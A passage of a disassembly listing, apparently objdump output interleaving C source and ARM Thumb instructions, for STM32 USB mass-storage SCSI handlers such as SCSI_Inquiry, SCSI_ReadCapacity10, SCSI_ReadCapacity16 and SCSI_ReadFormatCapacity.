    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009b38:	687b      	ldr	r3, [r7, #4]
 8009b3a:	3302      	adds	r3, #2
 8009b3c:	781b      	ldrb	r3, [r3, #0]
 8009b3e:	2b00      	cmp	r3, #0
 8009b40:	d105      	bne.n	8009b4e <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009b42:	2206      	movs	r2, #6
 8009b44:	4923      	ldr	r1, [pc, #140]	; (8009bd4 <SCSI_Inquiry+0xf8>)
 8009b46:	69b8      	ldr	r0, [r7, #24]
 8009b48:	f001 f8fa 	bl	800ad40 <SCSI_UpdateBotData>
 8009b4c:	e03d      	b.n	8009bca <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009b4e:	687b      	ldr	r3, [r7, #4]
 8009b50:	3302      	adds	r3, #2
 8009b52:	781b      	ldrb	r3, [r3, #0]
 8009b54:	2b80      	cmp	r3, #128	; 0x80
 8009b56:	d105      	bne.n	8009b64 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009b58:	2208      	movs	r2, #8
 8009b5a:	491f      	ldr	r1, [pc, #124]	; (8009bd8 <SCSI_Inquiry+0xfc>)
 8009b5c:	69b8      	ldr	r0, [r7, #24]
 8009b5e:	f001 f8ef 	bl	800ad40 <SCSI_UpdateBotData>
 8009b62:	e032      	b.n	8009bca <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009b64:	69bb      	ldr	r3, [r7, #24]
 8009b66:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b6a:	7f59      	ldrb	r1, [r3, #29]
 8009b6c:	2324      	movs	r3, #36	; 0x24
 8009b6e:	2205      	movs	r2, #5
 8009b70:	68f8      	ldr	r0, [r7, #12]
 8009b72:	f000 faff 	bl	800a174 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009b76:	f04f 33ff 	mov.w	r3, #4294967295
 8009b7a:	e027      	b.n	8009bcc <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009b7c:	68fb      	ldr	r3, [r7, #12]
 8009b7e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009b82:	68fa      	ldr	r2, [r7, #12]
 8009b84:	33b0      	adds	r3, #176	; 0xb0
 8009b86:	009b      	lsls	r3, r3, #2
 8009b88:	4413      	add	r3, r2
 8009b8a:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009b8c:	69d9      	ldr	r1, [r3, #28]
 8009b8e:	7afa      	ldrb	r2, [r7, #11]
 8009b90:	4613      	mov	r3, r2
 8009b92:	00db      	lsls	r3, r3, #3
 8009b94:	4413      	add	r3, r2
 8009b96:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009b98:	440b      	add	r3, r1
 8009b9a:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009b9c:	697b      	ldr	r3, [r7, #20]
 8009b9e:	3304      	adds	r3, #4
 8009ba0:	781b      	ldrb	r3, [r3, #0]
 8009ba2:	b29b      	uxth	r3, r3
 8009ba4:	3305      	adds	r3, #5
 8009ba6:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009ba8:	687b      	ldr	r3, [r7, #4]
 8009baa:	3304      	adds	r3, #4
 8009bac:	781b      	ldrb	r3, [r3, #0]
 8009bae:	b29b      	uxth	r3, r3
 8009bb0:	8bfa      	ldrh	r2, [r7, #30]
 8009bb2:	429a      	cmp	r2, r3
 8009bb4:	d303      	bcc.n	8009bbe <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009bb6:	687b      	ldr	r3, [r7, #4]
 8009bb8:	3304      	adds	r3, #4
 8009bba:	781b      	ldrb	r3, [r3, #0]
 8009bbc:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009bbe:	8bfb      	ldrh	r3, [r7, #30]
 8009bc0:	461a      	mov	r2, r3
 8009bc2:	6979      	ldr	r1, [r7, #20]
 8009bc4:	69b8      	ldr	r0, [r7, #24]
 8009bc6:	f001 f8bb 	bl	800ad40 <SCSI_UpdateBotData>
  }

  return 0;
 8009bca:	2300      	movs	r3, #0
}
 8009bcc:	4618      	mov	r0, r3
 8009bce:	3720      	adds	r7, #32
 8009bd0:	46bd      	mov	sp, r7
 8009bd2:	bd80      	pop	{r7, pc}
 8009bd4:	2000010c 	.word	0x2000010c
 8009bd8:	20000114 	.word	0x20000114

08009bdc <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009bdc:	b590      	push	{r4, r7, lr}
 8009bde:	b087      	sub	sp, #28
 8009be0:	af00      	add	r7, sp, #0
 8009be2:	60f8      	str	r0, [r7, #12]
 8009be4:	460b      	mov	r3, r1
 8009be6:	607a      	str	r2, [r7, #4]
 8009be8:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009bea:	68fb      	ldr	r3, [r7, #12]
 8009bec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009bf0:	68fb      	ldr	r3, [r7, #12]
 8009bf2:	32b0      	adds	r2, #176	; 0xb0
 8009bf4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009bf8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009bfa:	697b      	ldr	r3, [r7, #20]
 8009bfc:	2b00      	cmp	r3, #0
 8009bfe:	d102      	bne.n	8009c06 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009c00:	f04f 33ff 	mov.w	r3, #4294967295
 8009c04:	e075      	b.n	8009cf2 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009c06:	68fb      	ldr	r3, [r7, #12]
 8009c08:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c0c:	68fa      	ldr	r2, [r7, #12]
 8009c0e:	33b0      	adds	r3, #176	; 0xb0
 8009c10:	009b      	lsls	r3, r3, #2
 8009c12:	4413      	add	r3, r2
 8009c14:	685b      	ldr	r3, [r3, #4]
 8009c16:	685c      	ldr	r4, [r3, #4]
 8009c18:	697b      	ldr	r3, [r7, #20]
 8009c1a:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009c1e:	3308      	adds	r3, #8
 8009c20:	697a      	ldr	r2, [r7, #20]
 8009c22:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009c26:	3204      	adds	r2, #4
 8009c28:	7af8      	ldrb	r0, [r7, #11]
 8009c2a:	4619      	mov	r1, r3
 8009c2c:	47a0      	blx	r4
 8009c2e:	4603      	mov	r3, r0
 8009c30:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009c32:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009c36:	2b00      	cmp	r3, #0
 8009c38:	d106      	bne.n	8009c48 <SCSI_ReadCapacity10+0x6c>
 8009c3a:	697b      	ldr	r3, [r7, #20]
 8009c3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c40:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009c44:	2b02      	cmp	r3, #2
 8009c46:	d108      	bne.n	8009c5a <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009c48:	7af9      	ldrb	r1, [r7, #11]
 8009c4a:	233a      	movs	r3, #58	; 0x3a
 8009c4c:	2202      	movs	r2, #2
 8009c4e:	68f8      	ldr	r0, [r7, #12]
 8009c50:	f000 fa90 	bl	800a174 <SCSI_SenseCode>
    return -1;
 8009c54:	f04f 33ff 	mov.w	r3, #4294967295
 8009c58:	e04b      	b.n	8009cf2 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009c5a:	697b      	ldr	r3, [r7, #20]
 8009c5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c60:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009c62:	3b01      	subs	r3, #1
 8009c64:	0e1b      	lsrs	r3, r3, #24
 8009c66:	b2da      	uxtb	r2, r3
 8009c68:	697b      	ldr	r3, [r7, #20]
 8009c6a:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009c6c:	697b      	ldr	r3, [r7, #20]
 8009c6e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c72:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009c74:	3b01      	subs	r3, #1
 8009c76:	0c1b      	lsrs	r3, r3, #16
 8009c78:	b2da      	uxtb	r2, r3
 8009c7a:	697b      	ldr	r3, [r7, #20]
 8009c7c:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009c7e:	697b      	ldr	r3, [r7, #20]
 8009c80:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c84:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009c86:	3b01      	subs	r3, #1
 8009c88:	0a1b      	lsrs	r3, r3, #8
 8009c8a:	b2da      	uxtb	r2, r3
 8009c8c:	697b      	ldr	r3, [r7, #20]
 8009c8e:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009c90:	697b      	ldr	r3, [r7, #20]
 8009c92:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c96:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009c98:	b2db      	uxtb	r3, r3
 8009c9a:	3b01      	subs	r3, #1
 8009c9c:	b2da      	uxtb	r2, r3
 8009c9e:	697b      	ldr	r3, [r7, #20]
 8009ca0:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009ca2:	697b      	ldr	r3, [r7, #20]
 8009ca4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ca8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009cac:	161b      	asrs	r3, r3, #24
 8009cae:	b2da      	uxtb	r2, r3
 8009cb0:	697b      	ldr	r3, [r7, #20]
 8009cb2:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009cb4:	697b      	ldr	r3, [r7, #20]
 8009cb6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cba:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009cbe:	141b      	asrs	r3, r3, #16
 8009cc0:	b2da      	uxtb	r2, r3
 8009cc2:	697b      	ldr	r3, [r7, #20]
 8009cc4:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009cc6:	697b      	ldr	r3, [r7, #20]
 8009cc8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ccc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009cd0:	0a1b      	lsrs	r3, r3, #8
 8009cd2:	b29b      	uxth	r3, r3
 8009cd4:	b2da      	uxtb	r2, r3
 8009cd6:	697b      	ldr	r3, [r7, #20]
 8009cd8:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009cda:	697b      	ldr	r3, [r7, #20]
 8009cdc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ce0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ce4:	b2da      	uxtb	r2, r3
 8009ce6:	697b      	ldr	r3, [r7, #20]
 8009ce8:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009cea:	697b      	ldr	r3, [r7, #20]
 8009cec:	2208      	movs	r2, #8
 8009cee:	60da      	str	r2, [r3, #12]

  return 0;
 8009cf0:	2300      	movs	r3, #0

}
 8009cf2:	4618      	mov	r0, r3
 8009cf4:	371c      	adds	r7, #28
 8009cf6:	46bd      	mov	sp, r7
 8009cf8:	bd90      	pop	{r4, r7, pc}

08009cfa <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009cfa:	b590      	push	{r4, r7, lr}
 8009cfc:	b089      	sub	sp, #36	; 0x24
 8009cfe:	af00      	add	r7, sp, #0
 8009d00:	60f8      	str	r0, [r7, #12]
 8009d02:	460b      	mov	r3, r1
 8009d04:	607a      	str	r2, [r7, #4]
 8009d06:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d08:	68fb      	ldr	r3, [r7, #12]
 8009d0a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d0e:	68fb      	ldr	r3, [r7, #12]
 8009d10:	32b0      	adds	r2, #176	; 0xb0
 8009d12:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d16:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009d18:	69bb      	ldr	r3, [r7, #24]
 8009d1a:	2b00      	cmp	r3, #0
 8009d1c:	d102      	bne.n	8009d24 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009d1e:	f04f 33ff 	mov.w	r3, #4294967295
 8009d22:	e0ab      	b.n	8009e7c <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009d24:	68fb      	ldr	r3, [r7, #12]
 8009d26:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009d2a:	68fa      	ldr	r2, [r7, #12]
 8009d2c:	33b0      	adds	r3, #176	; 0xb0
 8009d2e:	009b      	lsls	r3, r3, #2
 8009d30:	4413      	add	r3, r2
 8009d32:	685b      	ldr	r3, [r3, #4]
 8009d34:	685c      	ldr	r4, [r3, #4]
 8009d36:	69bb      	ldr	r3, [r7, #24]
 8009d38:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009d3c:	3308      	adds	r3, #8
 8009d3e:	69ba      	ldr	r2, [r7, #24]
 8009d40:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009d44:	3204      	adds	r2, #4
 8009d46:	7af8      	ldrb	r0, [r7, #11]
 8009d48:	4619      	mov	r1, r3
 8009d4a:	47a0      	blx	r4
 8009d4c:	4603      	mov	r3, r0
 8009d4e:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009d50:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009d54:	2b00      	cmp	r3, #0
 8009d56:	d106      	bne.n	8009d66 <SCSI_ReadCapacity16+0x6c>
 8009d58:	69bb      	ldr	r3, [r7, #24]
 8009d5a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d5e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009d62:	2b02      	cmp	r3, #2
 8009d64:	d108      	bne.n	8009d78 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d66:	7af9      	ldrb	r1, [r7, #11]
 8009d68:	233a      	movs	r3, #58	; 0x3a
 8009d6a:	2202      	movs	r2, #2
 8009d6c:	68f8      	ldr	r0, [r7, #12]
 8009d6e:	f000 fa01 	bl	800a174 <SCSI_SenseCode>
    return -1;
 8009d72:	f04f 33ff 	mov.w	r3, #4294967295
 8009d76:	e081      	b.n	8009e7c <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009d78:	687b      	ldr	r3, [r7, #4]
 8009d7a:	330a      	adds	r3, #10
 8009d7c:	781b      	ldrb	r3, [r3, #0]
 8009d7e:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009d80:	687b      	ldr	r3, [r7, #4]
 8009d82:	330b      	adds	r3, #11
 8009d84:	781b      	ldrb	r3, [r3, #0]
 8009d86:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009d88:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009d8a:	687b      	ldr	r3, [r7, #4]
 8009d8c:	330c      	adds	r3, #12
 8009d8e:	781b      	ldrb	r3, [r3, #0]
 8009d90:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009d92:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009d94:	687a      	ldr	r2, [r7, #4]
 8009d96:	320d      	adds	r2, #13
 8009d98:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009d9a:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009d9c:	69bb      	ldr	r3, [r7, #24]
 8009d9e:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009da0:	2300      	movs	r3, #0
 8009da2:	61fb      	str	r3, [r7, #28]
 8009da4:	e008      	b.n	8009db8 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009da6:	69ba      	ldr	r2, [r7, #24]
 8009da8:	69fb      	ldr	r3, [r7, #28]
 8009daa:	4413      	add	r3, r2
 8009dac:	3310      	adds	r3, #16
 8009dae:	2200      	movs	r2, #0
 8009db0:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009db2:	69fb      	ldr	r3, [r7, #28]
 8009db4:	3301      	adds	r3, #1
 8009db6:	61fb      	str	r3, [r7, #28]
 8009db8:	69bb      	ldr	r3, [r7, #24]
 8009dba:	68db      	ldr	r3, [r3, #12]
 8009dbc:	69fa      	ldr	r2, [r7, #28]
 8009dbe:	429a      	cmp	r2, r3
 8009dc0:	d3f1      	bcc.n	8009da6 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009dc2:	69bb      	ldr	r3, [r7, #24]
 8009dc4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dc8:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009dca:	3b01      	subs	r3, #1
 8009dcc:	0e1b      	lsrs	r3, r3, #24
 8009dce:	b2da      	uxtb	r2, r3
 8009dd0:	69bb      	ldr	r3, [r7, #24]
 8009dd2:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009dd4:	69bb      	ldr	r3, [r7, #24]
 8009dd6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dda:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009ddc:	3b01      	subs	r3, #1
 8009dde:	0c1b      	lsrs	r3, r3, #16
 8009de0:	b2da      	uxtb	r2, r3
 8009de2:	69bb      	ldr	r3, [r7, #24]
 8009de4:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009de6:	69bb      	ldr	r3, [r7, #24]
 8009de8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dec:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009dee:	3b01      	subs	r3, #1
 8009df0:	0a1b      	lsrs	r3, r3, #8
 8009df2:	b2da      	uxtb	r2, r3
 8009df4:	69bb      	ldr	r3, [r7, #24]
 8009df6:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009df8:	69bb      	ldr	r3, [r7, #24]
 8009dfa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dfe:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e00:	b2db      	uxtb	r3, r3
 8009e02:	3b01      	subs	r3, #1
 8009e04:	b2da      	uxtb	r2, r3
 8009e06:	69bb      	ldr	r3, [r7, #24]
 8009e08:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009e0a:	69bb      	ldr	r3, [r7, #24]
 8009e0c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e10:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009e14:	161b      	asrs	r3, r3, #24
 8009e16:	b2da      	uxtb	r2, r3
 8009e18:	69bb      	ldr	r3, [r7, #24]
 8009e1a:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009e1c:	69bb      	ldr	r3, [r7, #24]
 8009e1e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e22:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009e26:	141b      	asrs	r3, r3, #16
 8009e28:	b2da      	uxtb	r2, r3
 8009e2a:	69bb      	ldr	r3, [r7, #24]
 8009e2c:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009e2e:	69bb      	ldr	r3, [r7, #24]
 8009e30:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e34:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009e38:	0a1b      	lsrs	r3, r3, #8
 8009e3a:	b29b      	uxth	r3, r3
 8009e3c:	b2da      	uxtb	r2, r3
 8009e3e:	69bb      	ldr	r3, [r7, #24]
 8009e40:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009e42:	69bb      	ldr	r3, [r7, #24]
 8009e44:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e48:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009e4c:	b2da      	uxtb	r2, r3
 8009e4e:	69bb      	ldr	r3, [r7, #24]
 8009e50:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e52:	687b      	ldr	r3, [r7, #4]
 8009e54:	330a      	adds	r3, #10
 8009e56:	781b      	ldrb	r3, [r3, #0]
 8009e58:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e5a:	687b      	ldr	r3, [r7, #4]
 8009e5c:	330b      	adds	r3, #11
 8009e5e:	781b      	ldrb	r3, [r3, #0]
 8009e60:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e62:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e64:	687b      	ldr	r3, [r7, #4]
 8009e66:	330c      	adds	r3, #12
 8009e68:	781b      	ldrb	r3, [r3, #0]
 8009e6a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009e6c:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009e6e:	687a      	ldr	r2, [r7, #4]
 8009e70:	320d      	adds	r2, #13
 8009e72:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009e74:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e76:	69bb      	ldr	r3, [r7, #24]
 8009e78:	60da      	str	r2, [r3, #12]

  return 0;
 8009e7a:	2300      	movs	r3, #0
}
 8009e7c:	4618      	mov	r0, r3
 8009e7e:	3724      	adds	r7, #36	; 0x24
 8009e80:	46bd      	mov	sp, r7
 8009e82:	bd90      	pop	{r4, r7, pc}

08009e84 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009e84:	b580      	push	{r7, lr}
 8009e86:	b088      	sub	sp, #32
 8009e88:	af00      	add	r7, sp, #0
 8009e8a:	60f8      	str	r0, [r7, #12]
 8009e8c:	460b      	mov	r3, r1
 8009e8e:	607a      	str	r2, [r7, #4]
 8009e90:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009e92:	68fb      	ldr	r3, [r7, #12]
 8009e94:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009e98:	68fb      	ldr	r3, [r7, #12]
 8009e9a:	32b0      	adds	r2, #176	; 0xb0
 8009e9c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ea0:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009ea2:	69bb      	ldr	r3, [r7, #24]
 8009ea4:	2b00      	cmp	r3, #0
 8009ea6:	d102      	bne.n	8009eae <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009ea8:	f04f 33ff 	mov.w	r3, #4294967295
 8009eac:	e063      	b.n	8009f76 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009eae:	68fb      	ldr	r3, [r7, #12]
 8009eb0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009eb4:	68fa      	ldr	r2, [r7, #12]
 8009eb6:	33b0      	adds	r3, #176	; 0xb0
 8009eb8:	009b      	lsls	r3, r3, #2
 8009eba:	4413      	add	r3, r2
 8009ebc:	685b      	ldr	r3, [r3, #4]
 8009ebe:	685b      	ldr	r3, [r3, #4]
 8009ec0:	f107 0214 	add.w	r2, r7, #20
 8009ec4:	f107 0110 	add.w	r1, r7, #16
 8009ec8:	7af8      	ldrb	r0, [r7, #11]
 8009eca:	4798      	blx	r3
 8009ecc:	4603      	mov	r3, r0
 8009ece:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009ed0:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009ed4:	2b00      	cmp	r3, #0
 8009ed6:	d106      	bne.n	8009ee6 <SCSI_ReadFormatCapacity+0x62>
 8009ed8:	69bb      	ldr	r3, [r7, #24]
 8009eda:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ede:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009ee2:	2b02      	cmp	r3, #2
 8009ee4:	d108      	bne.n	8009ef8 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ee6:	7af9      	ldrb	r1, [r7, #11]
 8009ee8:	233a      	movs	r3, #58	; 0x3a
 8009eea:	2202      	movs	r2, #2
 8009eec:	68f8      	ldr	r0, [r7, #12]
 8009eee:	f000 f941 	bl	800a174 <SCSI_SenseCode>
    return -1;
 8009ef2:	f04f 33ff 	mov.w	r3, #4294967295
 8009ef6:	e03e      	b.n	8009f76 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 8009ef8:	2300      	movs	r3, #0
 8009efa:	83fb      	strh	r3, [r7, #30]
 8009efc:	e007      	b.n	8009f0e <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 8009efe:	8bfb      	ldrh	r3, [r7, #30]
 8009f00:	69ba      	ldr	r2, [r7, #24]
 8009f02:	4413      	add	r3, r2
 8009f04:	2200      	movs	r2, #0
 8009f06:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 8009f08:	8bfb      	ldrh	r3, [r7, #30]
 8009f0a:	3301      	adds	r3, #1
 8009f0c:	83fb      	strh	r3, [r7, #30]
 8009f0e:	8bfb      	ldrh	r3, [r7, #30]
 8009f10:	2b0b      	cmp	r3, #11
 8009f12:	d9f4      	bls.n	8009efe <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 8009f14:	69bb      	ldr	r3, [r7, #24]
